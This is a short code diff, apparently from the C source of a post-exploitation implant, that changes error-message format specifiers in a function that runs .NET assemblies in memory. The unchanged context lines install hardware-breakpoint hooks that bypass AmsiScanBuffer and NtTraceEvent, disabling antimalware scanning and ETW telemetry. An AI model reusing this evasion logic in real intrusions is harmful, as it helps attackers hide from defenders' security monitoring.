@@ -128,7 +128,7 @@ BOOL DotnetExecute( BUFFER Assembly, BUFFER Arguments )
         {
             PUTS( "HwBp Engine add AmsiScanBuffer bypass" )
             if ( ! NT_SUCCESS( Status = HwBpEngineAdd( NULL, ThreadId, Instance.Win32.AmsiScanBuffer, HwBpExAmsiScanBuffer, 0 ) ) ) {
-                PRINTF( "Failed adding exception to HwBp Engine: %p\n", Status )
+                PRINTF( "Failed adding exception to HwBp Engine: %08x\n", Status )
                 return FALSE;
             }
         }
@@ -136,7 +136,7 @@ BOOL DotnetExecute( BUFFER Assembly, BUFFER Arguments )
         /* add Etw bypass */
         PUTS( "HwBp Engine add NtTraceEvent bypass" )
         if ( ! NT_SUCCESS( HwBpEngineAdd( NULL, ThreadId, Instance.Win32.NtTraceEvent, HwBpExNtTraceEvent, 1 ) ) ) {
-            PRINTF( "Failed adding exception to HwBp Engine: %p\n", Status )
+            PRINTF( "Failed adding exception to HwBp Engine: %08x\n", Status )
             return FALSE;
         }
 
